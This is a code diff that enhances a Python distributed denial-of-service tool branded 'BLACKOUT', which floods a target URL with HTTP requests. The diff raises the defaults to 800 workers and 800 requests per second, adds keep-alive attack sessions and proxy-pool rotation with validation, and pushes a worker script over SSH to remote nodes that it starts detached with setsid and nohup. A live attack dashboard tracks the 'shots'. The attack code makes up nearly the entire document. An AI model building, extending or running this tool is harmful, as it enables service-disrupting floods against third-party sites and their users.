@@ -37,15 +37,13 @@ PROXY_SSL_CTX.check_hostname = False
 PROXY_SSL_CTX.verify_mode = ssl_lib.CERT_NONE
 
 NODES_FILE = "nodes.json"
+DEFAULT_RPS = 800
+DEFAULT_WORKERS = 800
 
-# ============================================================
-#  GLOBAL INTERRUPT FLAG (fixes Ctrl+C multi-press issue)
-# ============================================================
 _INTERRUPTED = [False]
 
 
 def _restore_terminal():
-    """Restore terminal to sane state (cursor visible, no alt screen)."""
     try:
         sys.stdout.write("\033[?25h")
         sys.stdout.flush()
@@ -54,40 +52,52 @@ def _restore_terminal():
 
 
 def _sigint_handler(signum, frame):
-    """Immediate Ctrl+C handler - restores terminal and raises."""
     _INTERRUPTED[0] = True
     _restore_terminal()
-    raise KeyboardInterrupt()
+    try:
+        asyncio.get_running_loop()
+        return
+    except RuntimeError:
+        raise KeyboardInterrupt()
 
 
-# Install SIGINT handler
 try:
     signal.signal(signal.SIGINT, _sigint_handler)
 except Exception:
     pass
 
 
+async def interruptible_sleep(seconds):
+    end = time.time() + seconds
+    while time.time() < end:
+        if _INTERRUPTED[0]:
+            return
+        remaining = end - time.time()
+        await asyncio.sleep(min(0.5, max(0.05, remaining)))
+
+
 # ==================================================================
-#          MINIMAL NODE WORKER SCRIPT (stdlib-only, no aiohttp)
+#    HIGH-PERFORMANCE NODE WORKER SCRIPT
 # ==================================================================
 NODE_SCRIPT = r'''#!/usr/bin/env python3
-"""Minimal distributed attack worker - stdlib only."""
 import asyncio, ssl, random, string, sys, json, time, os, signal, base64
-import socket as _socket, ipaddress as _ipaddress
+import socket as _socket, ipaddress as _ipaddress, concurrent.futures, threading
 from urllib.parse import urlparse
 
 STATUS_FILE = "/tmp/node_attack_status.json"
 PID_FILE = "/tmp/node_attack.pid"
+LOG_FILE = "/tmp/node_attack.log"
 
 def log(msg):
     try:
-        with open("/tmp/node_attack.log", "a") as f:
+        with open(LOG_FILE, "a") as f:
             f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
     except Exception:
         pass
 
 def parse_args():
-    args = {"target": None, "workers": 200, "duration": 600, "proxies": ""}
+    args = {"target": None, "workers": 800, "duration": 600,
+            "proxies": "", "rps": 800}
     i = 1
     while i < len(sys.argv):
         a = sys.argv[i]
@@ -101,6 +111,10 @@ def parse_args():
             try: args["duration"] = int(sys.argv[i + 1])
             except: pass
             i += 2
+        elif a == "--rps" and i + 1 < len(sys.argv):
+            try: args["rps"] = int(sys.argv[i + 1])
+            except: pass
+            i += 2
         elif a == "--proxies" and i + 1 < len(sys.argv):
             args["proxies"] = sys.argv[i + 1]; i += 2
         else:
@@ -111,6 +125,7 @@ ARGS = parse_args()
 TARGET = ARGS["target"]
 WORKERS = ARGS["workers"]
 DURATION = ARGS["duration"]
+RPS = ARGS["rps"]
 
 PROXIES = []
 if ARGS["proxies"]:
@@ -132,7 +147,10 @@ BASE_PATH = parsed.path or "/"
 QUERY = parsed.query
 
 STATS = {"requests": 0, "success": 0, "timeouts": 0, "errors": 0, "blocked": 0, "srv_err": 0}
+STATS_LOCK = threading.Lock()
 RUNNING = [True]
+ERROR_COUNT = [0]
+CONNECTED_COUNT = [0]
 
 UAS = [
     "v2rayN/6.23", "Clashmeta/1.16.0", "Mozilla/5.0",
@@ -144,19 +162,30 @@ def rand_str(n=10):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
 
 def write_status(state):
-    data = dict(STATS)
-    data["state"] = state
-    data["ts"] = time.time()
     try:
-        with open(STATUS_FILE, "w") as f:
+        data = {
+            "requests": int(STATS["requests"]),
+            "success": int(STATS["success"]),
+            "timeouts": int(STATS["timeouts"]),
+            "errors": int(STATS["errors"]),
+            "blocked": int(STATS["blocked"]),
+            "srv_err": int(STATS["srv_err"]),
+            "connected": int(CONNECTED_COUNT[0]),
+            "errors_total": int(ERROR_COUNT[0]),
+            "state": str(state),
+            "ts": float(time.time()),
+            "pid": int(os.getpid()),
+        }
+        tmp = STATUS_FILE + ".tmp"
+        with open(tmp, "w") as f:
             json.dump(data, f)
-    except Exception:
-        pass
+        os.replace(tmp, STATUS_FILE)
+    except Exception as e:
+        log(f"write_status fail: {e}")
 
 def handle_signal(signum, frame):
     RUNNING[0] = False
     write_status("stopped")
-    log(f"STOP signal {signum}")
     try:
         os._exit(0)
     except Exception:
@@ -192,14 +221,9 @@ def pick_proxy():
     return None
 
 
-def _sync_open_socket(proxy, host, port, use_ssl, timeout):
+def _sync_connect(proxy, host, port, use_ssl, timeout):
     if proxy is None:
         s = _socket.create_connection((host, port), timeout=timeout)
-        if use_ssl:
-            ctx = ssl.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
-            s = ctx.wrap_socket(s, server_hostname=host)
         s.setblocking(False)
         return s
 
@@ -255,9 +279,7 @@ def _sync_open_socket(proxy, host, port, use_ssl, timeout):
         elif scheme in ("http", "https"):
             req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n"
             if puser:
-                token = base64.b64encode(
-                    f"{puser}:{ppwd or ''}".encode()
-                ).decode()
+                token = base64.b64encode(f"{puser}:{ppwd or ''}".encode()).decode()
                 req += f"Proxy-Authorization: Basic {token}\r\n"
             req += "Proxy-Connection: keep-alive\r\n\r\n"
             s.sendall(req.encode())
@@ -274,12 +296,6 @@ def _sync_open_socket(proxy, host, port, use_ssl, timeout):
                 line = buf.split(b"\r\n", 1)[0].decode(errors="ignore")
                 raise Exception(f"http-proxy: {line}")
 
-        if use_ssl:
-            ctx = ssl.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
-            s = ctx.wrap_socket(s, server_hostname=host)
-
         s.setblocking(False)
         return s
     except Exception:
@@ -290,68 +306,215 @@ def _sync_open_socket(proxy, host, port, use_ssl, timeout):
         raise
 
 
-async def open_connection(proxy, host, port, use_ssl, timeout=8):
-    sock = await asyncio.to_thread(_sync_open_socket, proxy, host, port, use_ssl, timeout)
-    reader, writer = await asyncio.open_connection(sock=sock)
-    return reader, writer
+class Session:
+    def __init__(self):
+        self.reader = None
+        self.writer = None
+        self.proxy = None
+
+    async def connect(self):
+        await self.close()
+        self.proxy = pick_proxy() if PROXIES else None
+        sock = await asyncio.to_thread(
+            _sync_connect, self.proxy, HOST, PORT, USE_SSL, 10
+        )
+        if USE_SSL:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            self.reader, self.writer = await asyncio.open_connection(
+                sock=sock, ssl=ctx, server_hostname=HOST
+            )
+        else:
+            self.reader, self.writer = await asyncio.open_connection(sock=sock)
+            
+    async def close(self):
+        if self.writer is not None:
+            try:
+                self.writer.close()
+                await self.writer.wait_closed()
+            except Exception:
+                pass
+        self.reader = None
+        self.writer = None
+        self.proxy = None
+
+    async def send_request(self, path):
+        req = (
+            f"GET {path} HTTP/1.1\r\n"
+            f"Host: {HOST_HEADER}\r\n"
+            f"User-Agent: {random.choice(UAS)}\r\n"
+            f"Accept: */*\r\n"
+            f"Accept-Encoding: identity\r\n"
+            f"Connection: keep-alive\r\n"
+            f"\r\n"
+        )
+        self.writer.write(req.encode())
+        await self.writer.drain()
+
+        headers_data = await asyncio.wait_for(
+            self.reader.readuntil(b"\r\n\r\n"), timeout=8
+        )
+        if not headers_data.startswith(b"HTTP/"):
+            raise Exception("bad response")
+
+        parts = headers_data.split(b" ", 2)
+        code = int(parts[1])
+
+        content_length = 0
+        is_chunked = False
+        for line in headers_data.split(b"\r\n")[1:]:
+            lline = line.lower()
+            if lline.startswith(b"content-length:"):
+                try:
+                    content_length = int(line.split(b":", 1)[1].strip())
+                except Exception:
+                    content_length = 0
+            elif lline.startswith(b"transfer-encoding:") and b"chunked" in lline:
+                is_chunked = True
+
+        if is_chunked:
+            while True:
+                try:
+                    chunk_line = await asyncio.wait_for(
+                        self.reader.readuntil(b"\r\n"), timeout=5
+                    )
+                    chunk_size = int(chunk_line.strip().split(b";")[0], 16)
+                    if chunk_size == 0:
+                        try:
+                            await asyncio.wait_for(
+                                self.reader.readuntil(b"\r\n"), timeout=2
+                            )
+                        except Exception:
+                            pass
+                        break
+                    await asyncio.wait_for(
+                        self.reader.readexactly(chunk_size + 2), timeout=5
+                    )
+                except Exception:
+                    break
+        elif content_length > 0:
+            to_read = min(content_length, 262144)
+            try:
+                await asyncio.wait_for(
+                    self.reader.readexactly(to_read), timeout=8
+                )
+                extra = content_length - to_read
+                while extra > 0:
+                    chunk = await asyncio.wait_for(
+                        self.reader.read(min(extra, 65536)), timeout=5
+                    )
+                    if not chunk:
+                        break
+                    extra -= len(chunk)
+            except Exception:
+                pass
+
+        return code
 
 
-async def worker():
+CONNECT_SEM = None
+
+
+async def worker(worker_id):
+    delay = (1.0 / RPS) if RPS and RPS > 0 else 0.0
+    session = Session()
+    connected = False
+
     while RUNNING[0]:
         try:
-            proxy = pick_proxy() if PROXIES else None
-            reader, writer = await open_connection(proxy, HOST, PORT, USE_SSL, timeout=8)
+            if not connected:
+                if CONNECT_SEM is not None:
+                    async with CONNECT_SEM:
+                        try:
+                            await session.connect()
+                            connected = True
+                            CONNECTED_COUNT[0] += 1
+                        except Exception as e:
+                            ERROR_COUNT[0] += 1
+                            if ERROR_COUNT[0] % 500 == 0:
+                                log(f"connect#{ERROR_COUNT[0]}: {type(e).__name__}: {str(e)[:60]}")
+                else:
+                    try:
+                        await session.connect()
+                        connected = True
+                        CONNECTED_COUNT[0] += 1
+                    except Exception:
+                        ERROR_COUNT[0] += 1
+                if not connected:
+                    await asyncio.sleep(0.2)
+                    continue
 
             if QUERY:
                 path = f"{BASE_PATH}?{QUERY}&x={rand_str(8)}"
             else:
                 path = f"{BASE_PATH}?x={rand_str(8)}"
 
-            req = (
-                f"GET {path} HTTP/1.1\r\n"
-                f"Host: {HOST_HEADER}\r\n"
-                f"User-Agent: {random.choice(UAS)}\r\n"
-                f"Accept: */*\r\n"
-                f"Connection: close\r\n"
-                f"\r\n"
-            )
-            writer.write(req.encode())
-            await writer.drain()
-
-            resp = await asyncio.wait_for(reader.read(2048), timeout=6)
-            STATS["requests"] += 1
-            if resp.startswith(b"HTTP/"):
-                try:
-                    code = int(resp.split(b" ", 2)[1])
-                    if code == 200:
-                        STATS["success"] += 1
-                    elif code == 403:
-                        STATS["blocked"] += 1
-                    elif code >= 500:
-                        STATS["srv_err"] += 1
-                    else:
-                        STATS["success"] += 1
-                except Exception:
-                    STATS["success"] += 1
-            else:
-                STATS["errors"] += 1
-
-            writer.close()
             try:
-                await writer.wait_closed()
+                code = await session.send_request(path)
+                STATS["requests"] += 1
+                if code == 200:
+                    STATS["success"] += 1
+                elif code in (403, 429):
+                    STATS["blocked"] += 1
+                elif code >= 500:
+                    STATS["srv_err"] += 1
+                else:
+                    STATS["success"] += 1
+            except (asyncio.TimeoutError, ConnectionError, OSError,
+                    asyncio.IncompleteReadError):
+                STATS["requests"] += 1
+                STATS["timeouts"] += 1
+                connected = False
+                try:
+                    await session.close()
+                except Exception:
+                    pass
+            except asyncio.CancelledError:
+                break
+            except Exception:
+                STATS["requests"] += 1
+                STATS["errors"] += 1
+                connected = False
+                try:
+                    await session.close()
+                except Exception:
+                    pass
+
+        except asyncio.CancelledError:
+            break
+        except Exception:
+            ERROR_COUNT[0] += 1
+            connected = False
+            try:
+                await session.close()
             except Exception:
                 pass
-        except asyncio.TimeoutError:
-            STATS["requests"] += 1
-            STATS["timeouts"] += 1
-        except Exception:
-            STATS["requests"] += 1
-            STATS["errors"] += 1
 
-        await asyncio.sleep(0.001)
+        if delay > 0:
+            await asyncio.sleep(delay)
+        else:
+            await asyncio.sleep(0)
+
+    try:
+        await session.close()
+    except Exception:
+        pass
 
 
 async def main():
+    global CONNECT_SEM
+
+    try:
+        thread_count = min(max(WORKERS, 64), 500)
+        loop = asyncio.get_running_loop()
+        executor = concurrent.futures.ThreadPoolExecutor(max_workers=thread_count)
+        loop.set_default_executor(executor)
+    except Exception as e:
+        log(f"executor setup fail: {e}")
+
+    CONNECT_SEM = asyncio.Semaphore(min(max(WORKERS // 4, 64), 300))
+
     try:
         with open(PID_FILE, "w") as f:
             f.write(str(os.getpid()))
@@ -359,14 +522,14 @@ async def main():
         pass
 
     log(f"START target={TARGET} workers={WORKERS} duration={DURATION} "
-        f"proxies={len(PROXIES)} pid={os.getpid()}")
+        f"rps={RPS} proxies={len(PROXIES)} pid={os.getpid()}")
     write_status("starting")
 
-    tasks = [asyncio.create_task(worker()) for _ in range(WORKERS)]
+    tasks = [asyncio.create_task(worker(i)) for i in range(WORKERS)]
 
     async def updater():
         while RUNNING[0]:
-            await asyncio.sleep(2)
+            await asyncio.sleep(1)
             write_status("attacking")
 
     updater_task = asyncio.create_task(updater())
@@ -385,7 +548,8 @@ async def main():
         except Exception:
             pass
         write_status("completed")
-        log("DONE")
+        log(f"DONE requests={STATS['requests']} success={STATS['success']} "
+            f"timeouts={STATS['timeouts']} errors={STATS['errors']}")
 
 if __name__ == "__main__":
     try:
@@ -426,6 +590,21 @@ def short_proxy(proxy):
     if "@" in p:
         p = p.split("@", 1)[1]
     return p
+
+
+class RateLimiter:
+    def __init__(self, rps):
+        self.rps = rps
+        if rps and rps > 0:
+            self.delay = 1.0 / rps
+        else:
+            self.delay = 0.0
+
+    async def wait(self):
+        if self.delay > 0:
+            await asyncio.sleep(self.delay)
+        else:
+            await asyncio.sleep(0)
 
 
 class SafeModeState:
@@ -481,13 +660,13 @@ def clear_screen():
 def print_banner():
     clear_screen()
     banner = f"""
-{Colors.CYAN}{Colors.BOLD}
-  ██╗   ██╗██████╗ ██╗          █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
-  ██║   ██║██╔══██╗██║         ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
-  ██║   ██║██████╔╝██║         ███████║   ██║      ██║   ███████║██║     █████╔╝ 
-  ██║   ██║██╔══██╗██║         ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
-  ╚██████╔╝██║  ██║███████╗    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
-   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
+{Colors.RED}{Colors.BOLD}
+  ██████╗ ██╗      █████╗  ██████╗██╗  ██╗ ██████╗ ██╗   ██╗████████╗
+  ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔═══██╗██║   ██║╚══██╔══╝
+  ██████╔╝██║     ███████║██║     █████╔╝ ██║   ██║██║   ██║   ██║   
+  ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║   ██║██║   ██║   ██║   
+  ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗╚██████╔╝╚██████╔╝   ██║   
+  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   
 {Colors.RESET}{Colors.BOLD}{Colors.MAGENTA}                  [ PANEL/SUB URL ATTACK ]
 {Colors.DIM}                  Advanced Target Extermination Framework{Colors.RESET}
 """
@@ -497,9 +676,6 @@ def random_string(length=12):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
 
-# ==================================================================
-#                    LIVE ATTACK DASHBOARD
-# ==================================================================
 class LiveDashboard:
     _THROTTLE_SEC = 3
 
@@ -522,9 +698,10 @@ class LiveDashboard:
         self._log_suppressed = {}
         self._prev_line_count = 0
         self._first_render = True
+        self.rps_limit = 0
 
     def start(self, target, engine, safe_mode, workers, workers_min,
-              workers_max, duration, stats):
+              workers_max, duration, stats, rps_limit=0):
         self.enabled = True
         self.target = target
         self.engine = engine
@@ -542,6 +719,7 @@ class LiveDashboard:
         self._log_suppressed = {}
         self._prev_line_count = 0
         self._first_render = True
+        self.rps_limit = rps_limit
 
     def stop(self):
         self.enabled = False
@@ -635,9 +813,14 @@ class LiveDashboard:
         self._rendering = True
 
         try:
+            try:
+                term_rows = os.get_terminal_size().lines
+            except (OSError, AttributeError):
+                term_rows = 40
+
             lines = []
             lines.append("")
-            lines.append(f"  {Colors.BOLD}{Colors.CYAN}● LIVE ATTACK DASHBOARD{Colors.RESET}")
+            lines.append(f"  {Colors.BOLD}{Colors.RED}● BLACKOUT · LIVE ATTACK DASHBOARD{Colors.RESET}")
             lines.append(f"  {Colors.DIM}{'─' * 76}{Colors.RESET}")
             lines.append("")
 
@@ -657,6 +840,11 @@ class LiveDashboard:
             sm = (f"{Colors.GREEN}ON{Colors.RESET}" if self.safe_mode
                   else f"{Colors.DIM}OFF{Colors.RESET}")
 
+            if self.rps_limit and self.rps_limit > 0:
+                rps_limit_str = f"  {Colors.DIM}· {self.rps_limit} rps/worker{Colors.RESET}"
+            else:
+                rps_limit_str = f"  {Colors.DIM}· unlimited{Colors.RESET}"
+
             lines.append(f"  {Colors.BOLD}● ATTACK STATUS{Colors.RESET}")
             lines.append(f"  {Colors.DIM}├─{Colors.RESET} Engine        {Colors.BOLD}{self.engine}{Colors.RESET}")
             lines.append(f"  {Colors.DIM}├─{Colors.RESET} Target        {Colors.DIM}{target_disp}{Colors.RESET}")
@@ -669,7 +857,7 @@ class LiveDashboard:
                          f"{Colors.DIM}(remaining {remaining_str}){Colors.RESET}")
             lines.append(f"  {Colors.DIM}├─{Colors.RESET} Total Shots   "
                          f"{Colors.BOLD}{total_shots:,}{Colors.RESET}  "
-                         f"{Colors.DIM}·  {rps:,.1f} req/s{Colors.RESET}")
+                         f"{Colors.DIM}·  {rps:,.1f} req/s{Colors.RESET}{rps_limit_str}")
             lines.append(
                 f"  {Colors.DIM}└─{Colors.RESET} Master        "
                 f"{Colors.GREEN}OK {ms.get('success', 0):,}{Colors.RESET}  "
@@ -724,13 +912,27 @@ class LiveDashboard:
                     st = PROXY_MANAGER.proxy_stats.get(p, {})
                     if not st.get("dead", False):
                         alive_cnt += 1
+
                 lines.append(
                     f"  {Colors.BOLD}{Colors.MAGENTA}● PROXY POOL{Colors.RESET}  "
                     f"{Colors.DIM}(mode: {PROXY_MANAGER.rotation_mode} · "
                     f"{alive_cnt} alive / {len(proxy_sessions)} total){Colors.RESET}"
                 )
-                for i, p in enumerate(proxy_sessions):
-                    prefix = "└─" if i == len(proxy_sessions) - 1 else "├─"
+
+                # FIX: cap proxy rows to keep dashboard fixed-size
+                MAX_PROXY_ROWS = 5
+                sorted_proxies = sorted(
+                    proxy_sessions,
+                    key=lambda p: PROXY_MANAGER.proxy_stats.get(p, {}).get("requests", 0),
+                    reverse=True,
+                )
+                shown = sorted_proxies[:MAX_PROXY_ROWS]
+                remaining_count = len(sorted_proxies) - len(shown)
+
+                for i, p in enumerate(shown):
+                    # last shown row: use └─ only if nothing else comes after it
+                    is_last = (i == len(shown) - 1) and (remaining_count == 0)
+                    prefix = "└─" if is_last else "├─"
                     st = PROXY_MANAGER.proxy_stats.get(p, {})
                     req = st.get("requests", 0)
                     ok = st.get("success", 0)
@@ -751,6 +953,14 @@ class LiveDashboard:
                         f"{Colors.RED}FAIL {fl:>5,}{Colors.RESET}  "
                         f"{Colors.DIM}{lat:>4}ms{Colors.RESET}"
                     )
+
+                if remaining_count > 0:
+                    lines.append(
+                        f"  {Colors.DIM}└─{Colors.RESET} "
+                        f"{Colors.DIM}... and {remaining_count} more proxies "
+                        f"(top {MAX_PROXY_ROWS} by req count){Colors.RESET}"
+                    )
+
                 lines.append("")
 
             if self.events:
@@ -767,8 +977,12 @@ class LiveDashboard:
                 lines.append("")
 
             if self.recent_logs:
+                max_logs = 8
+                if term_rows < 35:
+                    max_logs = 4
+                logs_to_show = self.recent_logs[-max_logs:]
                 lines.append(f"  {Colors.BOLD}● RECENT ACTIVITY{Colors.RESET}")
-                for status_type, msg, ts in self.recent_logs:
+                for status_type, msg, ts in logs_to_show:
                     ts_str = time.strftime("%H:%M:%S", time.localtime(ts))
                     pfx = self._log_prefix(status_type)
                     lines.append(f"  {Colors.DIM}{ts_str}{Colors.RESET}  {pfx}  {msg}")
@@ -816,7 +1030,6 @@ class LiveDashboard:
 
 
 LIVE_DASHBOARD = LiveDashboard()
-
 
 _LOG_THROTTLE = {}
 _LOG_THROTTLE_SEC = 3
@@ -877,7 +1090,7 @@ def log_event(status_type: str, message: str):
         prefix = f"{Colors.MAGENTA}● PROXY{Colors.RESET}"
     else:
         prefix = f"{Colors.RED}● FAIL/{status_type}{Colors.RESET}"
-    
+
     print(f"  {Colors.DIM}{timestamp}{Colors.RESET}  {prefix}  {message}")
 
 
@@ -892,9 +1105,6 @@ def save_json_report(filename_prefix: str, data: dict):
         print(f"\n  {Colors.RED}⚠{Colors.RESET} Failed to save log: {e}")
 
 
-# ==================================================================
-#                    PROXY MANAGER
-# ==================================================================
 class ProxyManager:
     def __init__(self):
         self.all_proxies = []
@@ -971,65 +1181,176 @@ class ProxyManager:
 
     async def validate_proxy(self, proxy, timeout=None):
         timeout = timeout or self.validation_timeout
+        if timeout > 15:
+            timeout = 15
         start = time.perf_counter()
+
+        ssl_ctx = ssl_lib.create_default_context()
+        ssl_ctx.check_hostname = False
+        ssl_ctx.verify_mode = ssl_lib.CERT_NONE
+
+        session = None
         try:
             if not SOCKS_AVAILABLE:
                 return False, 0, "aiohttp-socks missing"
+
             connector = ProxyConnector.from_url(
                 proxy,
-                limit=5,
-                limit_per_host=5,
+                limit=3,
+                limit_per_host=3,
                 enable_cleanup_closed=True,
+                ssl=ssl_ctx,
             )
-            async with aiohttp.ClientSession(connector=connector) as s:
-                async with s.get(
-                    self.validation_url,
-                    timeout=aiohttp.ClientTimeout(total=timeout)
-                ) as r:
-                    if r.status == 200:
-                        await r.text()
-                        latency = int((time.perf_counter() - start) * 1000)
-                        return True, latency, "OK"
-                    return False, 0, f"HTTP {r.status}"
+            session = aiohttp.ClientSession(
+                connector=connector,
+                timeout=aiohttp.ClientTimeout(total=timeout, connect=timeout),
+            )
+            async with session.get(
+                self.validation_url,
+                timeout=aiohttp.ClientTimeout(total=timeout, connect=timeout),
+                ssl=ssl_ctx,
+                allow_redirects=False,
+            ) as r:
+                if r.status == 200:
+                    await r.read()
+                    latency = int((time.perf_counter() - start) * 1000)
+                    return True, latency, "OK"
+                try:
+                    await r.read()
+                except Exception:
+                    pass
+                return False, 0, f"HTTP {r.status}"
         except asyncio.TimeoutError:
             return False, 0, "Timeout"
+        except asyncio.CancelledError:
+            raise
         except Exception as e:
             return False, 0, f"{type(e).__name__}: {str(e)[:60]}"
+        finally:
+            if session is not None:
+                try:
+                    await asyncio.shield(session.close())
+                except Exception:
+                    pass
 
     async def validate_all(self):
         if not self.all_proxies:
             return 0, 0, "No proxies loaded"
-        
-        print(f"\n  {Colors.CYAN}➜ Validating {len(self.all_proxies)} proxies "
-              f"(concurrency={self.validation_concurrency})...{Colors.RESET}\n")
+
+        if self.validation_timeout > 15:
+            self.validation_timeout = 15
+
+        total = len(self.all_proxies)
+        is_tty = sys.stdout.isatty()
+
+        print(f"\n  {Colors.CYAN}➜ Validating {total} proxies...{Colors.RESET}\n")
+
         sem = asyncio.Semaphore(self.validation_concurrency)
         self.proxy_stats = {}
         self.working_proxies = []
         self.dead_proxies = []
         alive_count = [0]
         dead_count = [0]
+        done_count = [0]
+        lock = asyncio.Lock()
+
+        def _progress_line():
+            done = done_count[0]
+            alive = alive_count[0]
+            dead = dead_count[0]
+            bar_len = 30
+            filled = int(bar_len * done / total) if total else 0
+            if filled >= bar_len:
+                bar = "=" * bar_len
+            else:
+                bar = "=" * filled + ">" + " " * (bar_len - filled - 1)
+            pct = int(done * 100 / total) if total else 0
+            return (
+                f"  Alive: {alive:>5}  Dead: {dead:>5}  "
+                f"Progress: {done:>5}/{total}  "
+                f"[{bar}]  {pct:>3}%"
+            )
+
+        # initial render of progress line
+        if is_tty:
+            sys.stdout.write(_progress_line())
+            sys.stdout.flush()
 
         async def check(p):
             async with sem:
-                ok, latency, msg = await self.validate_proxy(p)
-                if ok:
-                    self.proxy_stats[p] = {
-                        "requests": 0, "success": 0, "fails": 0,
-                        "consecutive_fails": 0, "dead": False,
-                        "latency_ms": latency, "last_check": time.time(),
-                        "status": "alive"
-                    }
-                    alive_count[0] += 1
-                    print(f"  {Colors.GREEN}● ALIVE{Colors.RESET}  {p:<45}  {Colors.DIM}|{Colors.RESET}  {Colors.BOLD}{latency:>5}ms{Colors.RESET}")
-                    return p, True
-                else:
-                    dead_count[0] += 1
-                    print(f"  {Colors.RED}● DEAD {Colors.RESET}  {p:<45}  {Colors.DIM}|{Colors.RESET}  {msg}")
-                    return p, False
+                try:
+                    ok, latency, msg = await self.validate_proxy(p)
+                except asyncio.CancelledError:
+                    raise
+                except Exception as e:
+                    ok, latency, msg = False, 0, f"Exc: {type(e).__name__}"
 
-        results = await asyncio.gather(*[check(p) for p in self.all_proxies])
-        self.working_proxies = [p for p, ok in results if ok]
-        self.dead_proxies = [p for p, ok in results if not ok]
+                async with lock:
+                    done_count[0] += 1
+                    if ok:
+                        self.proxy_stats[p] = {
+                            "requests": 0, "success": 0, "fails": 0,
+                            "consecutive_fails": 0, "dead": False,
+                            "latency_ms": latency, "last_check": time.time(),
+                            "status": "alive"
+                        }
+                        alive_count[0] += 1
+                    else:
+                        dead_count[0] += 1
+
+                    if is_tty:
+                        sys.stdout.write("\r" + _progress_line())
+                        sys.stdout.flush()
+
+                return p, ok, latency, msg
+
+        tasks = [asyncio.create_task(check(p)) for p in self.all_proxies]
+        results = []
+        try:
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+        except asyncio.CancelledError:
+            for t in tasks:
+                if not t.done():
+                    t.cancel()
+            try:
+                await asyncio.wait_for(
+                    asyncio.gather(*tasks, return_exceptions=True),
+                    timeout=5
+                )
+            except Exception:
+                pass
+            if is_tty:
+                sys.stdout.write("\n")
+                sys.stdout.flush()
+            raise
+
+        if is_tty:
+            sys.stdout.write("\n")
+            sys.stdout.flush()
+        print()
+
+        for r in results:
+            if isinstance(r, Exception):
+                continue
+            try:
+                p, ok, latency, msg = r
+            except Exception:
+                continue
+            if ok:
+                self.working_proxies.append(p)
+            else:
+                self.dead_proxies.append(p)
+
+        # Summary only — no per-proxy output
+        print(f"  {Colors.BOLD}● RESULT{Colors.RESET}")
+        print(f"  {Colors.DIM}├─{Colors.RESET} Total      "
+              f"{Colors.BOLD}{total}{Colors.RESET}")
+        print(f"  {Colors.DIM}├─{Colors.RESET} Alive      "
+              f"{Colors.GREEN}{alive_count[0]}{Colors.RESET}")
+        print(f"  {Colors.DIM}└─{Colors.RESET} Dead       "
+              f"{Colors.RED}{dead_count[0]}{Colors.RESET}")
+        print()
+
         return alive_count[0], dead_count[0], "Validation complete"
 
     async def create_sessions(self):
@@ -1192,9 +1513,6 @@ class ProxyManager:
 PROXY_MANAGER = ProxyManager()
 
 
-# ==================================================================
-#                    NODE / CLUSTER MANAGER
-# ==================================================================
 class NodeInfo:
     def __init__(self, ip, port=22, username="root", password=""):
         self.ip = ip
@@ -1409,12 +1727,18 @@ class NodeManager:
         except Exception:
             pass
 
-    async def start_attack(self, node, target, workers, duration, safe_mode=False, proxies=None):
+    async def start_attack(self, node, target, workers, duration,
+                           safe_mode=False, proxies=None, rps=DEFAULT_RPS):
         if not node.client:
             return False
 
-        await self.exec_cmd(node, "pkill -9 -f node_attack.py 2>/dev/null; sleep 0.3")
-        await self.exec_cmd(node, "rm -f /tmp/node_attack_status.json /tmp/node_attack.log /tmp/node_attack.pid /tmp/nohup.out")
+        await self.exec_cmd(node,
+            "pkill -9 -f '[n]ode_attack.py' 2>/dev/null; sleep 1")
+
+        await self.exec_cmd(node,
+            "rm -f /tmp/node_attack_status.json "
+            "/tmp/node_attack_status.json.tmp "
+            "/tmp/node_attack.log /tmp/node_attack.pid /tmp/nohup.out")
 
         target_esc = target.replace("'", "'\\''")
 
@@ -1430,39 +1754,44 @@ class NodeManager:
         cmd = (
             f"cd /tmp && setsid nohup python3 /tmp/node_attack.py "
             f"--target '{target_esc}' --workers {workers} --duration {duration} "
+            f"--rps {rps} "
             f"{proxies_arg}"
             f"> /tmp/nohup.out 2>&1 < /dev/null & "
             f"disown; echo STARTED"
         )
         await self.exec_cmd(node, cmd, timeout=10)
 
-        await asyncio.sleep(1.5)
-
-        check_out, _ = await self.exec_cmd(
-            node,
-            "pgrep -f 'node_attack.py' >/dev/null 2>&1 && echo RUNNING || echo DEAD",
-            timeout=5
-        )
-
-        if "RUNNING" in check_out:
-            node.status = "attacking"
-            node.error_msg = None
-            return True
+        for _ in range(12):
+            await asyncio.sleep(0.5)
+            check_out, _ = await self.exec_cmd(
+                node,
+                "if [ -f /tmp/node_attack_status.json ]; then "
+                "  echo -n 'OK:'; "
+                "  cat /tmp/node_attack_status.json; "
+                "else echo 'WAIT'; fi",
+                timeout=5
+            )
+            if check_out.startswith("OK:") and "requests" in check_out:
+                node.status = "attacking"
+                node.error_msg = None
+                return True
 
         log_out, _ = await self.exec_cmd(
             node,
-            "tail -3 /tmp/nohup.out 2>/dev/null | tr '\\n' ' '",
-            timeout=5
+            "echo '=== nohup.out ==='; tail -10 /tmp/nohup.out 2>/dev/null; "
+            "echo '=== log ==='; tail -10 /tmp/node_attack.log 2>/dev/null; "
+            "echo '=== pids ==='; ps aux | grep '[n]ode_attack' | head -3",
+            timeout=8
         )
-        node.error_msg = (log_out.strip()[:80] if log_out.strip()
-                          else "process not running")
+        node.error_msg = (log_out.strip()[:200] if log_out.strip()
+                          else "no status file created")
         node.status = "ready"
         return False
 
     async def stop_attack(self, node):
         if not node.client:
             return
-        await self.exec_cmd(node, "pkill -9 -f node_attack.py 2>/dev/null")
